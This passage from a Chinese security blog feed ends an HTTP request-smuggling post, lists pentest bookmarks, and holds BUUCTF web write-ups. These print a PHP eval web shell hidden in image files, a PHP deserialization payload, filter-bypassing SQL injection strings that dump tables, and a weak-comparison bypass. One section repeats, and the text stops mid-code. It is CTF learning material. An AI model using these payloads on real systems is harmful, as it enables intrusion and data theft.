请求走私漏洞，并且后端连接所使用的协议有可能会造成边界不统一的风险。防止 HTTP 请求走私漏洞的一些通用方法如下：</p>\n<p>1. 禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</p>\n<p>2. 使用 HTTP / 2 进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</p>\n<p>3. 前端服务器和后端服务器使用完全相同的 Web 服务器软件，以便它们就请求之间的界限达成一致。</p>\n<h1 id=\"传送门\"><a class=\"markdownIt-Anchor\" href=\"#传送门\">#</a> 传送门</h1>\n<p><a href=\"https://portswigger.net/web-security/request-smuggling\">PortSwigger_HTTP request smuggling</a></p>\n<p><a href=\"https://www.freebuf.com/column/221488.html\">HTTP 走私漏洞分析</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&amp;mid=2247486547&amp;idx=1&amp;sn=de1f1390b6526eb2e45a0e05c4fd444d&amp;chksm=9b392ae2ac4ea3f4fbc01e19a9494a2d8fec4b20fae5e93041cfc6f874f7eebff14d5420c499&amp;mpshare=1&amp;scene=23&amp;srcid=0824Nx28uGiuA86YDMRjhkR0&amp;sharer_sharetime=1598277825562&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd\">由一次渗透测试引发的 HTTP 请求走私思考 (牛的)</a></p>\n",
            "tags": [
                "web,HTTP"
            ]
        },
        {
            "id": "http://example.com/2021/07/05/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/",
            "url": "http://example.com/2021/07/05/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/",
            "title": "收藏夹喔",
            "date_published": "2021-07-05T03:25:08.000Z",
            "content_html": "<p><ins class=\"wavy\"><span class=\"rainbow\">好多值得再看的文章系列 o (￣ε￣*)</span></ins></p>\n<details class=\"danger\"><summary>内网相关</summary><div>\n<div class=\"note info\">\n<p>内网就。随缘学</p>\n</div>\n<div class=\"tab\" data-id=\"id3\" data-title=\"内网基础\">\n<p>content</p>\n<ul>\n<li><a href=\"https://www.4hou.com/posts/Jlo9\">盘点 RUNDLL32.EXE 的多种滥用方式及检测特征 - 41yf1sh</a></li>\n<li><a href=\"https://www.cnblogs.com/ssooking/articles/6171247.html\">CHM 渗透：从入门到 “入狱” - ssooking - 博客园</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/KfeKpoPj-X7BRNR7O6QAcw\">Linux 计划任务那些事</a></li>\n</ul>\n</div>\n<div class=\"tab\" data-id=\"id3\" data-title=\"新思路\">\n<p>content</p>\n<ul>\n<li><a href=\"https://mp.weixin.qq.com/s/ERJMCgb61dykT5rhQtYgMw\">内网渗透｜基于文件传输的 RDP 反向攻击</a></li>\n</ul>\n</div>\n</div></details>\n<details class=\"primary\"><summary>java相关</summary><div>\n<div class=\"note info\">\n<p>代码审计要好好学喔</p>\n<p>最重要的是 P 神的知识星球真的超赞🌟，知识星球搜代码审计就能搜到</p>\n</div>\n<ul>\n<li><a href=\"https://xie.infoq.cn/article/9a9387805a496e1485dc8430f\">java 代理详解</a></li>\n</ul>\n</div></details>\n<details class=\"info\"><summary>工具</summary><div>\n<div class=\"note info\">\n<p>用来记录工具链接</p>\n</div>\n<p><a href=\"https://github.com/No-Github/1earn/blob/master/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BurpSuite.md\">burp 使用小技巧</a></p>\n</div></details>\n<details class=\"warning\"><summary>渗透测试</summary><div>\n<div class=\"note info\">\n<p>渗透测试相关</p>\n</div>\n<ul>\n<li><a href=\"https://mp.weixin.qq.com/s/WAtkMzdOdbOD_9k98JRYBg\">WAF 绕过</a></li>\n<li><a href=\"https://xz.aliyun.com/t/10043#toc-7\">文件上传绕过思路拓展</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/rAcctU4XArY8SZYwkOAYjA\">XSS 大王</a></li>\n</ul>\n</div></details>\n<p>testtest</p>\n<h1 id=\"一号标题\"><a class=\"markdownIt-Anchor\" href=\"#一号标题\">#</a> 一号标题</h1>\n<h2 id=\"二号\"><a class=\"markdownIt-Anchor\" href=\"#二号\">#</a> 二号</h2>\n<h3 id=\"三号\"><a class=\"markdownIt-Anchor\" href=\"#三号\">#</a> 三号</h3>\n<h4 id=\"四号\"><a class=\"markdownIt-Anchor\" href=\"#四号\">#</a> 四号</h4>\n<h5 id=\"五号\"><a class=\"markdownIt-Anchor\" href=\"#五号\">#</a> 五号</h5>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2021/06/29/buuctf-web/",
            "url": "http://example.com/2021/06/29/buuctf-web/",
            "title": "Buuctf-web 武林秘籍",
            "date_published": "2021-06-29T03:30:13.000Z",
            "content_html": "<h2 id=\"极客大挑战2019-upload\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战2019-upload\">#</a> 极客大挑战 2019 upload</h2>\n<p><em>关键词：php，phtml，过滤 &lt;?，文件上传</em></p>\n<p>根据 Content-Type 判断图片：Content-Type: image/png</p>\n<p>过滤’&lt;?’，传 phtml 一句话木马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>phtml 简单来说就是将 php 嵌入 html 中</p>\n<p>(这题很诡异的是我上传一个正常图片，回显 Not Image)</p>\n<hr>\n<h2 id=\"极客大挑战2019-php\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战2019-php\">#</a> 极客大挑战 2019 php</h2>\n<p><em>关键词：php 反序列化，网站备份，php 代码审计</em></p>\n<p>🎀网站备份文件名猜测，嫌麻烦直接上目录扫描，为 www.zip</p>\n<p>www.zip 中包含的文件主要为 index.php，class.php，flag.php</p>\n<p>🎀index.php 中关键代码片段如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;select&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$res</span>=unserialize(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>从 get 请求中获取’select’的值，再将该变量反序列化（其中变量前加 @是为了防止报错信息输出，导致信息泄露）</p>\n<p>🎀class.php 中 Name 对象：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">O:<span class=\"number\">4</span><span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;password&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>从__destruct () 函数中的逻辑来看，只有当 password=100，username=admin 时，会输出 flag 的值</p>\n<p>__construct 构造函数会将我们传入的值赋值给变量 password 和 username，但是在反序列化后会调用__wakeup ()，将 username 赋值为 guest</p>\n<p><strong>CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</strong></p>\n<p>👆👆👆通过上述漏洞可以跳过__wakeup () 的执行</p>\n<p>构造 exp.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> Name();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">2</span>：&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>但是用 url 编码输出为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A3%<span class=\"number\">3</span>A%<span class=\"number\">22100</span>%<span class=\"number\">22</span>%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure>\n<p>在 Nameusername，Namepassword 中，类名以及变量名前都存在不可见字符 %00</p>\n<p>因为 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上 ascii 为 0 的字符 (不可见字符)</p>\n<p>⭐payload 需要修改的地方为成员变量个数，以及私有字段前增加 %00 (url 编码的不可见字符)</p>\n<p>payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select=O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;%00Name%00username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;%00Name%00password&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>总结</strong></p>\n<p>🌰<a href=\"https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/\">备份文件参考</a></p>\n<p>常见的网站源码备份文件后缀：tar、tar.gz、zip、rar</p>\n<p>常见的网站源码备份文件名：web、website、backup、back、www、wwwroot、temp</p>\n<p>🌰<a href=\"https://www.php.net/manual/zh/language.oop5.magic.php\">php 魔术方法</a></p>\n<p>serialize () 时，若存在__sleep ()，会先调用__sleep ()，再执行序列化操作</p>\n<p>unserialize () 时，若存在__wakeup ()，反序列化后会调用__wakeup ()</p>\n<hr>\n<h2 id=\"actf2020-新生赛-upload1\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛-upload1\">#</a> ACTF2020 新生赛 Upload1</h2>\n<p><em>关键词：图片马</em></p>\n<p>🐴合成图片马命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 2.jpg/b + shell.php/a shell.jpg</span><br></pre></td></tr></table></figure>\n<p>上传 shell.jpg，抓包更改后缀名为 php，回显 nonono~ Bad file！</p>\n<p>更改后缀名为随机乱码字符，回显上传成功，目测设置黑名单</p>\n<p><img src=\"buuctf-web1.png\" alt=\"\"></p>\n<p>设置 phtml 后缀名，绕过成功</p>\n<p>shell.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>合成图片马，上传改后缀，连 shell</p>\n<hr>\n<h2 id=\"极客大挑战-2019-babysql1\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019-babysql1\">#</a> 极客大挑战 2019 BabySQL1</h2>\n<p><em>关键词：sql 注入、过滤关键字、过滤特殊符号、字符拼接</em></p>\n<p>看题，登录框 sql 注入</p>\n<p>经测试，发现过滤字符：select，sleep，*，and，or，union…</p>\n<p>哈哈很多常用的嘛，不测了</p>\n<p><img src=\"buuctf-web2.png\" alt=\"\"></p>\n<p>考虑使用字符拼接绕过关键词检测，%2b 为’+‘url 编码，直接使用’+' 会被转成空格，payload：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; an%2bd+slee%2bp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>然后看着题目，发现过滤的关键字都置空的，双写也能绕过</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; anandd sleesleepp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>打点到此结束⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐</p>\n<p>直接登录获得的并不是 flag，继续找 ，order by 发现为 3 个字段</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; o%2brder b%2by 4--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>回显的字段为 2，3</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,2,3--+</span></span><br></pre></td></tr></table></figure>\n<p>爆表，从 information_schema.tables 中查找当前数据库所有表名，拼接在一起后在第二个字段输出</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(table_name),3 fr%2bom info%2brmation_schema.tables whe%2bre ta%2bble_schema=database()--+</span></span><br></pre></td></tr></table></figure>\n<p>爆字段</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(column_name),3 fr%2bom info%2brmation_schema.columns whe%2bre ta%2bble_name=&#x27;</span>b4bsql<span class=\"string\">&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello id,username,password！</span><br></pre></td></tr></table></figure>\n<p>然后发现两个表字段都是一样的，那找 b4bsql 中的数据吧</p>\n<p>拼接每行数据，并用 — 隔开</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(concat_ws(&#x27;</span><span class=\"comment\">---&#x27;,username,passwo%2brd)),3 fr%2bom b4bsql--+</span></span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<p><img src=\"buuctf-web3.png\" alt=\"\"></p>\n<p><strong>总结</strong></p>\n<p><a href=\"https://www.cnblogs.com/apolloren/p/11002449.html\">SQL 字符串拼接</a></p>\n<hr>\n<h2 id=\"actf2020-新生赛-backupfile1\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛-backupfile1\">#</a> ACTF2020 新生赛 BackupFile1</h2>\n<p><em>关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表</em></p>\n<p>看题，找备份文件，index.php.bak</p>\n<p>🐴index.php 代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);    &#125;    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;    &#125;&#125;<span class=\"keyword\">else</span> &#123;    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>分析 1️⃣下，get 传递参数 key</p>\n<p>key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值</p>\n<p>最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag</p>\n<p>ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人</p>\n<p>ლ(╹◡╹ლ) 好了，百度完回来了</p>\n<p>is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）</p>\n<p>intval ()，获取变量的整数值，默认为十进制</p>\n<p>==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分</p>\n<p>⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的</p>\n<p>好了 payload：?key=123，成功拿到 flag</p>\n<p>…(＿ ＿) ノ｜壁</p>\n<hr>\n<h2 id=\"actf2020-新生赛-backupfile1-2\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛-backupfile1-2\">#</a> ACTF2020 新生赛 BackupFile1</h2>\n<p><em>关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表</em></p>\n<p>看题，找备份文件，index.php.bak</p>\n<p>🐴index.php 代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);    &#125;    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;    &#125;&#125;<span class=\"keyword\">else</span> &#123;    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>分析 1️⃣下，get 传递参数 key</p>\n<p>key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值</p>\n<p>最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag</p>\n<p>ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人</p>\n<p>ლ(╹◡╹ლ) 好了，百度完回来了</p>\n<p>is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）</p>\n<p>intval ()，获取变量的整数值，默认为十进制</p>\n<p>==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分</p>\n<p>⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的</p>\n<p>好了 payload：?key=123，成功拿到 flag</p>\n<p>…(＿ ＿) ノ｜壁</p>\n<hr>\n<h2 id=\"hctf-2018-admin1\"><a class=\"markdownIt-Anchor\" href=\"#hctf-2018-admin1\">#</a> HCTF 2018 admin1</h2>\n<p><em>关键字：flask，session 伪造，unicode 欺骗</em></p>\n<p>🦋登录和注册界面，看题 admin</p>\n<p>输入 admin/admin 登录失败</p>\n<p>注册 admin/admin 该账户已被注册</p>\n<p>🦋爆破⑧行，试了几个弱口令，我觉得留一个注册页面应该是用来注册的</p>\n<p>注册 admin123/admin123（弱口令老玩家٩◔̯◔۶ ）</p>\n<p>登录后回显（测了一遍并没有什么用）：</p>\n<p><img src=\"buuctf-web5.png\" style=\"zoom:40%;\" /><img src=\"buuctf-web6.png\" style=\"zoom:40%;\" /></p>\n<img src=\"buuctf-web4.png\" style=\"zoom:22%;\" />\n<p>🦋在 changepassword 中有一行被注释掉的提示信息</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>\n<p>flask 是一个微型的 python 开发的 web 框架</p>\n<p>然后发现是题目源码，但是.sql 文件中存储的 admin 密码是 hash 加密过的</p>\n<p>🎀对不起我只能想到构造 admin 的 session 登录 session 用户了</p>\n<p><img src=\"buuctf-web7.gif\" alt=\"img\"></p>\n<p>给当前登录用户的 session 解密如下：</p>\n<p><img src=\"buuctf-web7.png\" alt=\"\"></p>\n<p>可以看到当前登录用户是 admin123 辣</p>\n<p>index.html 界面会回显用户账户名，目测是根据 session 中的 name 回显的，查看源代码中的 index.html 文件：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 